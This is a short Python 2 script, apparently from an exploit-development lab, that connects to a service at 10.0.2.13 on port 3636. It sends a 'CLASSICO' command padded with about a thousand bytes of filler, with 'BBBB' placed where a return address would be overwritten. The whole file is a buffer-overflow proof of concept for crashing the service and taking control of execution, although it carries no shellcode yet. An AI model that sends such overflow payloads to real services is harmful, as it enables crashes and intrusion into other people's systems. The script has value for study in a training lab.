#!/usr/bin/python
import socket

IP="10.0.2.13"
PORTA=3636

payload = "A" * 503
payload += "BBBB"
payload += "D" * 500

buffer = "CLASSICO "
buffer += payload

print "[+] Enviando..."

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
r.connect((IP,PORTA))

r.send(buffer)

r.close()
